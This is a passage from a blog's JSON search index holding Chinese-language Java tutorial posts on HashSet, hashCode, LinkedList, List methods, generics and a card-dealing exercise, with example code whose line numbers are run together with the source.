&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_HashSet存储自定义类型元素","slug":"java00175-HashSet存储自定义类型元素","date":"2020-03-21T17:33:26.000Z","updated":"2020-03-21T17:38:05.130Z","comments":true,"path":"2020/03/22/java00175-HashSet存储自定义类型元素/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00175-HashSet存储自定义类型元素/","excerpt":"","text":"HashSet存储自定义类型元素 1234567891011121314151617181920212223242526272829303132package com.itheima.demo02.Set;import java.util.HashSet;/* HashSet存储自定义类型元素 set集合报错元素唯一: 存储的元素(String,Integer,...Student,Person...),必须重写hashCode方法和equals方法 要求: 同名同年龄的人,视为同一个人,只能存储一次 */public class Demo03HashSetSavePerson &#123; public static void main(String[] args) &#123; //创建HashSet集合存储Person HashSet&lt;Person&gt; set = new HashSet&lt;&gt;(); Person p1 = new Person(\"小美女\",18); Person p2 = new Person(\"小美女\",18); Person p3 = new Person(\"小美女\",19); System.out.println(p1.hashCode());//1967205423 System.out.println(p2.hashCode());//42121758 System.out.println(p1==p2);//false System.out.println(p1.equals(p2));//false set.add(p1); set.add(p2); set.add(p3); System.out.println(set); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package com.itheima.demo02.Set;import java.util.Objects;public class Person &#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_Set集合存储元素不重复的原理","slug":"java00174-Set集合存储元素不重复的原理","date":"2020-03-21T17:28:15.000Z","updated":"2020-03-21T17:29:47.228Z","comments":true,"path":"2020/03/22/java00174-Set集合存储元素不重复的原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00174-Set集合存储元素不重复的原理/","excerpt":"","text":"12345678910111213141516171819202122package com.itheima.demo02.Set;import java.util.HashSet;/* Set集合不允许存储重复元素的原理 */public class Demo02HashSetSaveString &#123; public static void main(String[] args) &#123; //创建HashSet集合对象 HashSet&lt;String&gt; set = new HashSet&lt;&gt;(); String s1 = new String(\"abc\"); String s2 = new String(\"abc\"); set.add(s1); set.add(s2); set.add(\"重地\"); set.add(\"通话\"); set.add(\"abc\"); System.out.println(set);//[重地, 通话, abc] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_哈希值","slug":"java00173-哈希值","date":"2020-03-21T17:14:47.000Z","updated":"2020-04-02T15:44:49.198Z","comments":true,"path":"2020/03/22/java00173-哈希值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00173-哈希值/","excerpt":"","text":"什么是哈希表呢？ 在JDK1.8之前，哈希表底层采用数组+链表实现，即使用链表处理冲突，同一hash值的元素都存储在一个链表里。但是当位于一个桶中的元素较多，即hash值相等的元素较多时，通过key值依次查找的效率较低。而JDK1.8中，哈希表存储采用数组+链表+红黑树实现，当链表长度超过阈值（8）时，将链表转换为红黑树，这样大大减少了查找时间。 简单的来说，哈希表是由数组+链表+红黑树（JDK1.8增加了红黑树部分）实现的，如下图所示。 看到这张图就有人要问了，这个是怎么存储的呢？ 为了方便大家的理解我们结合一个存储流程图来说明一下： 总而言之，JDK1.8引入红黑树大程度优化了HashMap的性能，那么对于我们来讲保证HashSet集合元素的唯一，其实就是根据对象的hashCode和equals方法来决定的。如果我们往集合中存放自定义的对象，那么保证其唯一，就必须复写hashCode和equals方法建立属于当前对象的比较方式。 1234567891011121314151617181920212223242526272829303132333435363738394041package com.itheima.demo03.hashCode;/* 哈希值:是一个十进制的整数,由系统随机给出(就是对象的地址值,是一个逻辑地址,是模拟出来得到地址,不是数据实际存储的物理地址) 在Object类有一个方法,可以获取对象的哈希值 int hashCode() 返回该对象的哈希码值。 hashCode方法的源码: public native int hashCode(); native:代表该方法调用的是本地操作系统的方法 */public class Demo01HashCode &#123; public static void main(String[] args) &#123; //Person类继承了Object类,所以可以使用Object类的hashCode方法 Person p1 = new Person(); int h1 = p1.hashCode(); System.out.println(h1);//1967205423 | 1 Person p2 = new Person(); int h2 = p2.hashCode(); System.out.println(h2);//42121758 | 1 /* toString方法的源码: return getClass().getName() + \"@\" + Integer.toHexString(hashCode()); */ System.out.println(p1);//com.itheima.demo03.hashCode.Person@75412c2f System.out.println(p2);//com.itheima.demo03.hashCode.Person@282ba1e System.out.println(p1==p2);//false /* String类的哈希值 String类重写Obejct类的hashCode方法 */ String s1 = new String(\"abc\"); String s2 = new String(\"abc\"); System.out.println(s1.hashCode());//96354 System.out.println(s2.hashCode());//96354 System.out.println(\"重地\".hashCode());//1179395 System.out.println(\"通话\".hashCode());//1179395 &#125;&#125; 12345678910package com.itheima.demo03.hashCode;public class Person extends Object&#123; //重写hashCode方法 @Override public int hashCode() &#123; return 1; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_HashSet集合介绍","slug":"java00172-HashSet集合介绍","date":"2020-03-21T17:12:33.000Z","updated":"2020-03-21T17:13:04.475Z","comments":true,"path":"2020/03/22/java00172-HashSet集合介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00172-HashSet集合介绍/","excerpt":"","text":"HashSet集合介绍 java.util.HashSet是Set接口的一个实现类，它所存储的元素是不可重复的，并且元素都是无序的(即存取顺序不一致)。java.util.HashSet底层的实现其实是一个java.util.HashMap支持，由于我们暂时还未学习，先做了解。 HashSet是根据对象的哈希值来确定元素在集合中的存储位置，因此具有良好的存取和查找性能。保证元素唯一性的方式依赖于：hashCode与equals方法。 12","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_LinkedList集合","slug":"java00171-LinkedList集合","date":"2020-03-21T16:28:37.000Z","updated":"2020-03-21T17:22:11.658Z","comments":true,"path":"2020/03/22/java00171-LinkedList集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00171-LinkedList集合/","excerpt":"","text":"java.util.LinkedList集合数据存储的结构是链表结构。方便元素添加、删除的集合。 LinkedList是一个双向链表，那么双向链表是什么样子的呢，我们用个图了解下 实际开发中对一个集合元素的添加与删除经常涉及到首尾操作，而LinkedList提供了大量首尾操作的方法。这些方法我们作为了解即可： public void addFirst(E e):将指定元素插入此列表的开头。 public void addLast(E e):将指定元素添加到此列表的结尾。 public E getFirst():返回此列表的第一个元素。 public E getLast():返回此列表的最后一个元素。 public E removeFirst():移除并返回此列表的第一个元素。 public E removeLast():移除并返回此列表的最后一个元素。 public E pop():从此列表所表示的堆栈处弹出一个元素。 public void push(E e):将元素推入此列表所表示的堆栈。 public boolean isEmpty()：如果列表不包含元素，则返回true。 public E remove(int index) 移除此列表中指定位置处的元素。将任何后续元素向左移（从索引中减 1）。返回从列表中删除的元素。 LinkedList是List的子类，List中的方法LinkedList都是可以使用。在开发时，LinkedList集合也可以作为堆栈，队列的结构使用。（了解即可） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899package com.itheima.demo01.List;import java.util.LinkedList;/* java.util.LinkedList集合 implements List接口 LinkedList集合的特点: 1.底层是一个链表结构:查询慢,增删快 2.里边包含了大量操作首尾元素的方法 注意:使用LinkedList集合特有的方法,不能使用多态 - public void addFirst(E e):将指定元素插入此列表的开头。 - public void addLast(E e):将指定元素添加到此列表的结尾。 - public void push(E e):将元素推入此列表所表示的堆栈。 - public E getFirst():返回此列表的第一个元素。 - public E getLast():返回此列表的最后一个元素。 - public E removeFirst():移除并返回此列表的第一个元素。 - public E removeLast():移除并返回此列表的最后一个元素。 - public E pop():从此列表所表示的堆栈处弹出一个元素。 - public boolean isEmpty()：如果列表不包含元素，则返回true。 */public class Demo02LinkedList &#123; public static void main(String[] args) &#123; show03(); &#125; /* - public E removeFirst():移除并返回此列表的第一个元素。 - public E removeLast():移除并返回此列表的最后一个元素。 - public E pop():从此列表所表示的堆栈处弹出一个元素。此方法相当于 removeFirst */ private static void show03() &#123; //创建LinkedList集合对象 LinkedList&lt;String&gt; linked = new LinkedList&lt;&gt;(); //使用add方法往集合中添加元素 linked.add(\"a\"); linked.add(\"b\"); linked.add(\"c\"); System.out.println(linked);//[a, b, c] //String first = linked.removeFirst(); String first = linked.pop(); System.out.println(\"被移除的第一个元素:\"+first); String last = linked.removeLast(); System.out.println(\"被移除的最后一个元素:\"+last); System.out.println(linked);//[b] &#125; /* - public E getFirst():返回此列表的第一个元素。 - public E getLast():返回此列表的最后一个元素。 */ private static void show02() &#123; //创建LinkedList集合对象 LinkedList&lt;String&gt; linked = new LinkedList&lt;&gt;(); //使用add方法往集合中添加元素 linked.add(\"a\"); linked.add(\"b\"); linked.add(\"c\"); //linked.clear();//清空集合中的元素 在获取集合中的元素会抛出NoSuchElementException //public boolean isEmpty()：如果列表不包含元素，则返回true。 if(!linked.isEmpty())&#123; String first = linked.getFirst(); System.out.println(first);//a String last = linked.getLast(); System.out.println(last);//c &#125; &#125; /* - public void addFirst(E e):将指定元素插入此列表的开头。 - public void addLast(E e):将指定元素添加到此列表的结尾。 - public void push(E e):将元素推入此列表所表示的堆栈。此方法等效于 addFirst(E)。 */ private static void show01() &#123; //创建LinkedList集合对象 LinkedList&lt;String&gt; linked = new LinkedList&lt;&gt;(); //使用add方法往集合中添加元素 linked.add(\"a\"); linked.add(\"b\"); linked.add(\"c\"); System.out.println(linked);//[a, b, c] //public void addFirst(E e):将指定元素插入此列表的开头。 //linked.addFirst(\"www\"); linked.push(\"www\"); System.out.println(linked);//[www, a, b, c] //public void addLast(E e):将指定元素添加到此列表的结尾。此方法等效于 add() linked.addLast(\"com\"); System.out.println(linked);//[www, a, b, c, com] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_ArrayList集合","slug":"java00170-ArrayList集合","date":"2020-03-21T16:21:14.000Z","updated":"2020-03-21T16:23:07.401Z","comments":true,"path":"2020/03/22/java00170-ArrayList集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00170-ArrayList集合/","excerpt":"","text":"ArrayList集合 java.util.ArrayList集合数据存储的结构是数组结构。元素增删慢，查找快，由于日常开发中使用最多的功能为查询数据、遍历数据，所以ArrayList是最常用的集合。 许多程序员开发时非常随意地使用ArrayList完成任何需求，并不严谨，这种用法是不提倡的。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_List集合介绍和常用方法","slug":"java00169-List集合介绍和常用方法","date":"2020-03-21T16:09:51.000Z","updated":"2020-03-21T16:11:24.330Z","comments":true,"path":"2020/03/22/java00169-List集合介绍和常用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00169-List集合介绍和常用方法/","excerpt":"","text":"java.util.List接口 extends Collection接口 List接口的特点: 1.有序的集合,存储元素和取出元素的顺序是一致的(存储123 取出123) 2.有索引,包含了一些带索引的方法 3.允许存储重复的元素 List接口中带索引的方法(特有) public void add(int index, E element): 将指定的元素，添加到该集合中的指定位置上。 public E get(int index):返回集合中指定位置的元素。 public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 注意: 操作索引的时候,一定要防止索引越界异常 IndexOutOfBoundsException:索引越界异常,集合会报 ArrayIndexOutOfBoundsException:数组索引越界异常 StringIndexOutOfBoundsException:字符串索引越界异常 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package com.itheima.demo01.List;import java.util.ArrayList;import java.util.Iterator;import java.util.List;public class Demo01List &#123; public static void main(String[] args) &#123; //创建一个List集合对象,多态 List&lt;String&gt; list = new ArrayList&lt;&gt;(); //使用add方法往集合中添加元素 list.add(\"a\"); list.add(\"b\"); list.add(\"c\"); list.add(\"d\"); list.add(\"a\"); //打印集合 System.out.println(list);//[a, b, c, d, a] 不是地址重写了toString //public void add(int index, E element): 将指定的元素，添加到该集合中的指定位置上。 //在c和d之间添加一个itheima list.add(3,\"itheima\");//[a, b, c, itheima, d, a] System.out.println(list); //public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 //移除元素 String removeE = list.remove(2); System.out.println(\"被移除的元素:\"+removeE);//被移除的元素:c System.out.println(list);//[a, b, itheima, d, a] //public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 //把最后一个a,替换为A String setE = list.set(4, \"A\"); System.out.println(\"被替换的元素:\"+setE);//被替换的元素:a System.out.println(list);//[a, b, itheima, d, A] //List集合遍历有3种方式 //使用普通的for循环 for(int i=0; i&lt;list.size(); i++)&#123; //public E get(int index):返回集合中指定位置的元素。 String s = list.get(i); System.out.println(s); &#125; System.out.println(\"-----------------\"); //使用迭代器 Iterator&lt;String&gt; it = list.iterator(); while(it.hasNext())&#123; String s = it.next(); System.out.println(s); &#125; System.out.println(\"-----------------\"); //使用增强for for (String s : list) &#123; System.out.println(s); &#125; String r = list.get(5);//IndexOutOfBoundsException: Index 5 out-of-bounds for length 5 System.out.println(r); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_红黑树","slug":"java00168数据结构-红黑树","date":"2020-03-21T16:06:51.000Z","updated":"2020-03-21T16:07:20.394Z","comments":true,"path":"2020/03/22/java00168数据结构-红黑树/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00168数据结构-红黑树/","excerpt":"","text":"数据结构_红黑树","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_链表","slug":"java00167数据结构-链表","date":"2020-03-21T15:31:33.000Z","updated":"2020-03-21T16:05:41.456Z","comments":true,"path":"2020/03/21/java00167数据结构-链表/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00167数据结构-链表/","excerpt":"","text":"数据结构_链表","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_数组","slug":"java00166数据结构-数组","date":"2020-03-21T15:26:58.000Z","updated":"2020-03-21T15:28:17.701Z","comments":true,"path":"2020/03/21/java00166数据结构-数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00166数据结构-数组/","excerpt":"","text":"数组 数据结构","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_队列","slug":"java00165数据结构-队列","date":"2020-03-21T15:23:40.000Z","updated":"2020-03-22T05:10:23.704Z","comments":true,"path":"2020/03/21/java00165数据结构-队列/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00165数据结构-队列/","excerpt":"","text":"队列数据结构","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_栈","slug":"java00164数据结构-栈","date":"2020-03-21T15:18:15.000Z","updated":"2020-03-21T15:20:43.559Z","comments":true,"path":"2020/03/21/java00164数据结构-栈/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00164数据结构-栈/","excerpt":"","text":"栈数据结构","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"斗地主案例的需求分析和代码实现","slug":"java00163斗地主案例的需求分析和代码实现","date":"2020-03-16T03:49:07.000Z","updated":"2020-03-16T03:51:45.054Z","comments":true,"path":"2020/03/16/java00163斗地主案例的需求分析和代码实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00163斗地主案例的需求分析和代码实现/","excerpt":"","text":"斗地主案例的需求分析和代码实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package com.itheima.demo04.Test;import java.util.ArrayList;import java.util.Collections;/* 斗地主综合案例: 1.准备牌 2.洗牌 3.发牌 4.看牌 */public class DouDiZhu &#123; public static void main(String[] args) &#123; //1.准备牌 //定义一个存储54张牌的ArrayList集合,泛型使用String ArrayList&lt;String&gt; poker = new ArrayList&lt;&gt;(); //定义两个数组,一个数组存储牌的花色,一个数组存储牌的序号 String[] colors = &#123;\"♠\",\"♥\",\"♣\",\"♦\"&#125;; String[] numbers = &#123;\"2\",\"A\",\"K\",\"Q\",\"J\",\"10\",\"9\",\"8\",\"7\",\"6\",\"5\",\"4\",\"3\"&#125;; //先把大王和小王存储到poker集合中 poker.add(\"大王\"); poker.add(\"小王\"); //循环嵌套遍历两个数组,组装52张牌 for(String number : numbers)&#123; for (String color : colors) &#123; //System.out.println(color+number); //把组装好的牌存储到poker集合中 poker.add(color+number); &#125; &#125; //System.out.println(poker); /* 2.洗牌 使用集合的工具类Collections中的方法 static void shuffle(List&lt;?&gt; list) 使用默认随机源对指定列表进行置换。 */ Collections.shuffle(poker); //System.out.println(poker); /* 3.发牌 */ //定义4个集合,存储玩家的牌和底牌 ArrayList&lt;String&gt; player01 = new ArrayList&lt;&gt;(); ArrayList&lt;String&gt; player02 = new ArrayList&lt;&gt;(); ArrayList&lt;String&gt; player03 = new ArrayList&lt;&gt;(); ArrayList&lt;String&gt; diPai = new ArrayList&lt;&gt;(); /* 遍历poker集合,获取每一张牌 使用poker集合的索引%3给3个玩家轮流发牌 剩余3张牌给底牌 注意: 先判断底牌(i&gt;=51),否则牌就发没了 */ for (int i = 0; i &lt; poker.size() ; i++) &#123; //获取每一张牌 String p = poker.get(i); //轮流发牌 if(i&gt;=51)&#123; //给底牌发牌 diPai.add(p); &#125;else if(i%3==0)&#123; //给玩家1发牌 player01.add(p); &#125;else if(i%3==1)&#123; //给玩家2发牌 player02.add(p); &#125;else if(i%3==2)&#123; //给玩家3发牌 player03.add(p); &#125; &#125; //4.看牌 System.out.println(\"刘德华:\"+player01); System.out.println(\"周润发:\"+player02); System.out.println(\"周星驰:\"+player03); System.out.println(\"底牌:\"+diPai); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java泛型通配符","slug":"java00162泛型通配符","date":"2020-03-16T03:38:57.000Z","updated":"2020-03-28T05:33:16.739Z","comments":true,"path":"2020/03/16/java00162泛型通配符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00162泛型通配符/","excerpt":"","text":"java泛型通配符 当使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符&lt;?&gt;表示。但是一旦使用泛型的通配符后，只能使用Object类中的共性方法，集合中元素自身方法无法使用。 通配符基本使用 泛型的通配符:不知道使用什么类型来接收的时候,此时可以使用?,?表示未知通配符。 此时只能接受数据,不能往该集合中存储数据。 泛型的通配符: ?:代表任意的数据类型 使用方式: 不能创建对象使用 只能作为方法的参数使用 泛型的上限： 格式：类型名称 &lt;? extends 类 &gt; 对象名称 意义： 只能接收该类型及其子类 泛型的下限： 格式： 类型名称 &lt;? super 类 &gt; 对象名称 意义： 只能接收该类型及其父类型 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.itheima.demo03.Generic;import java.util.ArrayList;import java.util.Iterator;public class Demo05Generic &#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; list01 = new ArrayList&lt;&gt;(); list01.add(1); list01.add(2); ArrayList&lt;String&gt; list02 = new ArrayList&lt;&gt;(); list02.add(\"a\"); list02.add(\"b\"); printArray(list01); printArray(list02); //ArrayList&lt;?&gt; list03 = new ArrayList&lt;?&gt;(); &#125; /* 定义一个方法,能遍历所有类型的ArrayList集合 这时候我们不知道ArrayList集合使用什么数据类型,可以泛型的通配符?来接收数据类型 注意: 泛型没有继承概念的 //报错 public static void printArray(ArrayList&lt;Object&gt; list)&#123; &#125; */ //如果尖括号中写Integer,printArray(list02);会报错 //如果尖括号中写String,printArray(list01);会报错 //所有我们使用泛型通配符 public static void printArray(ArrayList&lt;?&gt; list)&#123; //使用迭代器遍历集合 Iterator&lt;?&gt; it = list.iterator(); while(it.hasNext())&#123; //it.next()方法,取出的元素是Object,可以接收任意的数据类型 Object o = it.next(); System.out.println(o); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738package com.itheima.demo03.Generic;import java.util.ArrayList;import java.util.Collection;/* 泛型的上限限定: ? extends E 代表使用的泛型只能是E类型的子类/本身 泛型的下限限定: ? super E 代表使用的泛型只能是E类型的父类/本身 */public class Demo06Generic &#123; public static void main(String[] args) &#123; Collection&lt;Integer&gt; list1 = new ArrayList&lt;Integer&gt;(); Collection&lt;String&gt; list2 = new ArrayList&lt;String&gt;(); Collection&lt;Number&gt; list3 = new ArrayList&lt;Number&gt;(); Collection&lt;Object&gt; list4 = new ArrayList&lt;Object&gt;(); getElement1(list1); //getElement1(list2);//报错 getElement1(list3); //getElement1(list4);//报错 //getElement2(list1);//报错 //getElement2(list2);//报错 getElement2(list3); getElement2(list4); /* 类与类之间的继承关系 Integer extends Number extends Object String extends Object */ &#125; // 泛型的上限：此时的泛型?，必须是Number类型或者Number类型的子类 public static void getElement1(Collection&lt;? extends Number&gt; coll)&#123;&#125; // 泛型的下限：此时的泛型?，必须是Number类型或者Number类型的父类 public static void getElement2(Collection&lt;? super Number&gt; coll)&#123;&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java定义和使用含有泛型的接口","slug":"java00161定义和使用含有泛型的接口","date":"2020-03-16T03:30:48.000Z","updated":"2020-03-16T03:36:58.757Z","comments":true,"path":"2020/03/16/java00161定义和使用含有泛型的接口/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00161定义和使用含有泛型的接口/","excerpt":"","text":"java定义和使用含有泛型的接口 定义格式： 12修饰符 interface 接口名&lt;代表泛型的变量&gt; &#123; &#125; 123456789101112131415161718package com.itheima.demo03.Generic;/* 测试含有泛型的接口 */public class Demo04GenericInterface &#123; public static void main(String[] args) &#123; //创建GenericInterfaceImpl1对象 GenericInterfaceImpl1 gi1 = new GenericInterfaceImpl1(); gi1.method(\"字符串\"); //创建GenericInterfaceImpl2对象 GenericInterfaceImpl2&lt;Integer&gt; gi2 = new GenericInterfaceImpl2&lt;&gt;(); gi2.method(10); GenericInterfaceImpl2&lt;Double&gt; gi3 = new GenericInterfaceImpl2&lt;&gt;(); gi3.method(8.8); &#125;&#125; 1234567891011121314151617package com.itheima.demo03.Generic;/* 含有泛型的接口,第一种使用方式:定义接口的实现类,实现接口,指定接口的泛型 public interface Iterator&lt;E&gt; &#123; E next(); &#125; Scanner类实现了Iterator接口,并指定接口的泛型为String,所以重写的next方法泛型默认就是String public final class Scanner implements Iterator&lt;String&gt;&#123; public String next() &#123;&#125; &#125; */public class GenericInterfaceImpl1 implements GenericInterface&lt;String&gt;&#123; @Override public void method(String s) &#123; System.out.println(s); &#125;&#125; 1234567package com.itheima.demo03.Generic;/* 定义含有泛型的接口 */public interface GenericInterface&lt;I&gt; &#123; public abstract void method(I i);&#125; 1234567891011121314151617181920package com.itheima.demo03.Generic;/* 含有泛型的接口第二种使用方式:接口使用什么泛型,实现类就使用什么泛型,类跟着接口走 就相当于定义了一个含有泛型的类,创建对象的时候确定泛型的类型 public interface List&lt;E&gt;&#123; boolean add(E e); E get(int index); &#125; public class ArrayList&lt;E&gt; implements List&lt;E&gt;&#123; public boolean add(E e) &#123;&#125; public E get(int index) &#123;&#125; &#125; */public class GenericInterfaceImpl2&lt;I&gt; implements GenericInterface&lt;I&gt; &#123; @Override public void method(I i) &#123; System.out.println(i); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java定义和使用含有泛型的方法","slug":"java00160定义和使用含有泛型的方法","date":"2020-03-16T03:24:53.000Z","updated":"2020-03-16T03:37:09.101Z","comments":true,"path":"2020/03/16/java00160定义和使用含有泛型的方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00160定义和使用含有泛型的方法/","excerpt":"","text":"java定义和使用含有泛型的方法 定义含有泛型的方法: 泛型定义在方法的修饰符和返回值类型之间 格式: 123修饰符 &lt;泛型&gt; 返回值类型 方法名(参数列表(使用泛型))&#123;方法体;&#125; 含有泛型的方法,在调用方法的时候确定泛型的数据类型 传递什么类型的参数,泛型就是什么类型 12345678910111213141516171819202122232425package com.itheima.demo03.Generic;/* 测试含有泛型的方法 */public class Demo03GenericMethod &#123; public static void main(String[] args) &#123; //创建GenericMethod对象 GenericMethod gm = new GenericMethod(); /* 调用含有泛型的方法method01 传递什么类型,泛型就是什么类型 */ gm.method01(10); gm.method01(\"abc\"); gm.method01(8.8); gm.method01(true); gm.method02(\"静态方法,不建议创建对象使用\"); //静态方法,通过类名.方法名(参数)可以直接使用 GenericMethod.method02(\"静态方法\"); GenericMethod.method02(1); &#125;&#125; 12345678910111213package com.itheima.demo03.Generic;public class GenericMethod &#123; //定义一个含有泛型的方法 public &lt;M&gt; void method01(M m)&#123; System.out.println(m); &#125; //定义一个含有泛型的静态方法 public static &lt;S&gt; void method02(S s)&#123; System.out.println(s); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java定义和使用含有泛型的类","slug":"java00159定义和使用含有泛型的类","date":"2020-03-16T03:17:49.000Z","updated":"2020-03-21T15:07:08.567Z","comments":true,"path":"2020/03/16/java00159定义和使用含有泛型的类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00159定义和使用含有泛型的类/","excerpt":"","text":"java定义和使用含有泛型的类 定义一个含有泛型的类,模拟ArrayList集合 泛型是一个未知的数据类型,当我们不确定什么什么数据类型的时候,可以使用泛型 泛型可以接收任意的数据类型,可以使用Integer,String,Student… 创建对象的时候确定泛型的数据类型 定义格式： 123修饰符 class 类名&lt;代表泛型的变量&gt;&#123; &#125; 1234567891011121314151617181920212223package com.itheima.demo03.Generic;public class Demo02GenericClass &#123; public static void main(String[] args) &#123; //不写泛型默认为Object类型 GenericClass gc = new GenericClass(); gc.setName(\"只能是字符串\"); Object obj = gc.getName(); //创建GenericClass对象,泛型使用Integer类型 GenericClass&lt;Integer&gt; gc2 = new GenericClass&lt;&gt;(); gc2.setName(1); Integer name = gc2.getName(); System.out.println(name); //创建GenericClass对象,泛型使用String类型 GenericClass&lt;String&gt; gc3 = new GenericClass&lt;&gt;(); gc3.setName(\"小明\"); String name1 = gc3.getName(); System.out.println(name1); &#125;&#125; 12345678910111213package com.itheima.demo03.Generic;public class GenericClass&lt;E&gt; &#123; private E name; public E getName() &#123; return name; &#125; public void setName(E name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java使用泛型的好处","slug":"java00158使用泛型的好处","date":"2020-03-16T03:09:52.000Z","updated":"2020-03-16T03:16:18.699Z","comments":true,"path":"2020/03/16/java00158使用泛型的好处/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00158使用泛型的好处/","excerpt":"","text":"java使用泛型的好处 创建集合对象,使用泛型 好处: 避免了类型转换的麻烦,存储的是什么类型,取出的就是什么类型 把运行期异常(代码运行之后会抛出的异常),提升到了编译期(写代码的时候会报错) 弊端: 泛型是什么类型,只能存储什么类型的数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package com.itheima.demo03.Generic;import java.util.ArrayList;import java.util.Iterator;public class Demo01Generic &#123; public static void main(String[] args) &#123; show02(); &#125; private static void show02() &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"abc\"); //list.add(1);//add(java.lang.String)in ArrayList cannot be applied to (int) //使用迭代器遍历list集合 Iterator&lt;String&gt; it = list.iterator(); while(it.hasNext())&#123; String s = it.next(); System.out.println(s+\"-&gt;\"+s.length()); &#125; &#125; /* 创建集合对象,不使用泛型 好处: 集合不使用泛型,默认的类型就是Object类型,可以存储任意类型的数据 弊端: 不安全,会引发异常 */ private static void show01() &#123; ArrayList list = new ArrayList(); list.add(\"abc\"); list.add(1); //使用迭代器遍历list集合 //获取迭代器 Iterator it = list.iterator(); //使用迭代器中的方法hasNext和next遍历集合 while(it.hasNext())&#123; //取出元素也是Object类型 Object obj = it.next(); System.out.println(obj); //想要使用String类特有的方法,length获取字符串的长度;不能使用 多态 Object obj = \"abc\"; //需要向下转型 //会抛出ClassCastException类型转换异常,不能把Integer类型转换为String类型 String s = (String)obj; System.out.println(s.length()); &#125; 